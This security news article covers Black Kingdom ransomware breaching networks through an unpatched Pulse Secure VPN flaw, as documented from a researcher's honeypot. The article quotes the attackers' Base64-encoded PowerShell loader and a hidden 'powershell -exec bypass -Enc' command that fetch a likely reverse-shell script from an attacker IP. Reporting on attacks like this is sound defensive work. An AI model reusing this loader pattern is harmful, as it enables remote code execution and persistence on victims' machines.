Operators of Black Kingdom ransomware are targeting enterprises with unpatched Pulse
Secure VPN software or initial access on the network, security researchers have found.
The malware got caught in a honeypot, allowing researchers to analyze and document the
tactics used by the threat actors.

Modus operandi
They’re exploiting CVE-2019-11510, a critical vulnerability affecting earlier versions of Pulse
Secure VPN that was patched in April 2019. Companies delayed updating their software
even after exploits became public, prompting multiple alerts from the U.S. government and
threat actors started leveraging it; some organizations continue to run a vulnerable version of
the product.
REDTEAM.PL, a company offering cybersecurity services based in Poland, observed that
Black Kingdom operators used the same doorway provided by Pulse Secure VPN to breach
what they believed was a target.

From the researchers’ observations, the ransomware established persistence by
impersonating a legitimate scheduled task for Google Chrome, with a single letter making the
difference:
GoogleUpdateTaskMachineUSA - Black Kingdom task
GoogleUpdateTaskMachineUA - legitimate Google Chrome task

According to REDTEAM.PL’s analysis, the scheduled task runs a Base64-encoded string
code in a hidden PowerShell window to fetch a script named “reverse.ps1” that is likely used
to open a reverse shell on the compromised host.
cversions_cache.ps1 script:
$update =
"SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvA

powershell.exe -exec bypass -nologo -Enc $update

Adam Ziaja of REDTEAM.PL told BleepingComputer that the script could not be retrieved
from the remote server controlled by the attacker, probably because the server hosting it was
blocked before the payload could be delivered.
The IP address where “reverse.ps1” resided is 198.13.49.179, which is managed by Choopa,
a child company of Vultr, well known for the cheap virtual private servers (VPS) it provides
and for being used by cybercriminals to host their malicious tools.
It resolves to three domains, the third one being connected to other servers in the U.S. and
Italy hosting Android and cryptocurrency mining malware.

Recent appearance
Black Kingdom ransomware was first spotted in late February by security
researcher GrujaRS, who found that it appended the .DEMON extension to encrypted files.
The sample analyzed (1, 2) contacted the same IP address found in REDTEAM.PL’s report.
It dropped the following ransom note asking for $10,000 to be deposited to a bitcoin wallet
and threatening that failing to do so would lead to the data to be destroyed or sold.

Checking the bitcoin address provided by the attacker shows an empty balance and two
incoming transactions totaling 0.55BTC, converted to $5,200 at the moment of writing.
